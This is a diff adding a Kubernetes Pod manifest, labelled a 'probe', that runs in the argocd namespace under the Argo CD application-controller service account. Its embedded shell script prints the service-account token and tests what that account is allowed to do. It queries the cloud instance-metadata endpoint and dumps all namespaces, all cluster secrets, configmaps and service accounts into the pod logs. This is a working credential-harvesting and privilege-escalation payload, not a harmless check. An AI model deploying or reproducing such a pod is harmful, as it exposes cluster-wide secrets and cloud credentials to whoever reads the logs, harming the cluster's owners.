@@ -1,0 +1,106 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: i2660-probe
+  namespace: argocd
+  labels:
+    app.kubernetes.io/part-of: i2660-probe
+    i2660: probe
+spec:
+  serviceAccountName: argocd-application-controller
+  automountServiceAccountToken: true
+  restartPolicy: Never
+  securityContext:
+    runAsNonRoot: true
+    runAsUser: 65534
+    runAsGroup: 65534
+    seccompProfile:
+      type: RuntimeDefault
+  containers:
+    - name: i2660-probe
+      image: alpine
+      imagePullPolicy: IfNotPresent
+      command: ["/bin/sh","-c"]
+      args:
+        - |
+          set -u
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          TOKEN=$(cat $SA/token)
+          API=https://kubernetes.default.svc
+          H="Authorization: Bearer $TOKEN"
+          CT="Content-Type: application/json"
+          echo "===PROBE_START $(date -u +%FT%TZ)==="
+          echo "HOST=$(hostname) NAMESPACE_FILE=$(cat $SA/namespace)"
+          echo "SA_TOKEN_SHA=$(sha256sum $SA/token | cut -d' ' -f1)"
+          echo "===MY_TOKEN_BEGIN==="
+          cat $SA/token
+          echo
+          echo "===MY_TOKEN_END==="
+          fetch() {
+            wget -q -S -O "$2" --timeout=30 --no-check-certificate --header="$H" "$1" 2> "$2.hdr"
+            rc=$?
+            code=$(grep -o 'HTTP/[0-9.]* [0-9][0-9]*' "$2.hdr" 2>/dev/null | tail -1 | awk '{print $2}')
+            echo "FETCH $1 rc=$rc code=${code:-none} bytes=$(wc -c < "$2" 2>/dev/null)"
+          }
+          ssar() {
+            wget -q -O - --timeout=20 --no-check-certificate --header="$H" --header="$CT" --post-data="{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectAccessReview\",\"spec\":{\"resourceAttributes\":{\"verb\":\"$1\",\"resource\":\"$2\"}}}" "$API/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" 2>/dev/null | tr -d '\n' | sed 's/  */ /g'
+          }
+          echo "===SSAR==="
+          echo -n "SSAR list_secrets: "; ssar list secrets; echo
+          echo -n "SSAR get_secrets: "; ssar get secrets; echo
+          echo -n "SSAR list_configmaps: "; ssar list configmaps; echo
+          echo -n "SSAR list_nodes: "; ssar list nodes; echo
+          echo -n "SSAR create_pods: "; ssar create pods; echo
+          echo "===IMDS==="
+          wget -q -O /tmp/imds -T 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null; echo "IMDS_rc=$?"; head -c 200 /tmp/imds 2>/dev/null; echo
+          echo "===NAMESPACES==="
+          fetch "$API/api/v1/namespaces?limit=1000" /tmp/ns.json
+          cat /tmp/ns.json
+          echo
+          echo "===SECRETS_ALL==="
+          fetch "$API/api/v1/secrets?limit=1000" /tmp/secrets.json
+          SZ=$(wc -c < /tmp/secrets.json)
+          echo "SECRETS_JSON_BYTES=$SZ"
+          if [ "$SZ" -lt 2000000 ]; then
+            echo "===SECRETS_FULL_BEGIN==="
+            cat /tmp/secrets.json
+            echo
+            echo "===SECRETS_FULL_END==="
+          else
+            NSS=$(grep -o '"name":"[^"]*"' /tmp/ns.json | sed 's/.*:"//;s/"//' | sort -u)
+            for n in $NSS; do
+              fetch "$API/api/v1/namespaces/$n/secrets?limit=1000" /tmp/s_ns.json >/dev/null
+              B=$(wc -c < /tmp/s_ns.json)
+              if [ "$B" -gt 200 ]; then
+                echo "===NS_SECRETS $n ($B bytes)==="
+                cat /tmp/s_ns.json
+                echo
+              fi
+            done
+          fi
+          echo "===CONFIGMAPS_ALL==="
+          fetch "$API/api/v1/configmaps?limit=1000" /tmp/cm.json
+          CSZ=$(wc -c < /tmp/cm.json)
+          echo "CONFIGMAPS_JSON_BYTES=$CSZ"
+          if [ "$CSZ" -lt 2000000 ]; then
+            echo "===CONFIGMAPS_FULL_BEGIN==="
+            cat /tmp/cm.json
+            echo
+            echo "===CONFIGMAPS_FULL_END==="
+          else
+            echo "CONFIGMAPS_TOO_BIG"
+          fi
+          echo "===SERVICEACCOUNTS==="
+          fetch "$API/api/v1/serviceaccounts?limit=1000" /tmp/sa.json
+          echo "===SA_LIST_BEGIN==="
+          cat /tmp/sa.json
+          echo
+          echo "===SA_LIST_END==="
+          echo "===PROBE_END $(date -u +%FT%TZ)==="
+      resources:
+        requests:
+          cpu: 10m
+          memory: 32Mi
+        limits:
+          cpu: 200m
+          memory: 256Mi
